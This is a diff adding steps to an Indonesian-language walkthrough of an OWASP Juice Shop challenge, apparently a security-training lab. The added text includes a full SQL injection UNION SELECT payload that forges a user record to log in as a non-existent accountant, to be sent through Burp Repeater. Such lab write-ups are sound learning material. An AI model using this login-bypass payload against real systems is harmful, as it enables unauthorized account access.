@@ -19,7 +19,11 @@ Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever re
       "deletedAt": 9
     }
 ```
-2. ![alt text](image-32.png)
-## Coding Challenge
-### Find It
-### Fix It
+2. Cari endpoint user login dan buat query untuk login akun yang diminta 
+```sql 
+' UNION SELECT 45 as id, 'acnt' as username, 'acc0unt4nt@juice-sh.op' as email, '1234' as password, 'customer' as role, '' as deluxeToken, 'localhost' as lastLoginIp, 'default.svg' as profileImage, '' as totpSecret, 1 as isActive, '2024-08-30 14:32:12.456' as createdAt, '2024-08-30 14:32:12.456' as updatedAt, null as deletedAt--' AND password = '098f6bcd4621d373cade4e832627b4f6' AND deletedAt IS NULL;
+```
+
+3. Setelah *Send to Repeater* ubah emailnya menjadi payload yang telah dibuat dan jalankan. ![alt text](image-32.png)
+Muncul token di sebelah kanan yang menandakan bahwa authorization berhasil.
+
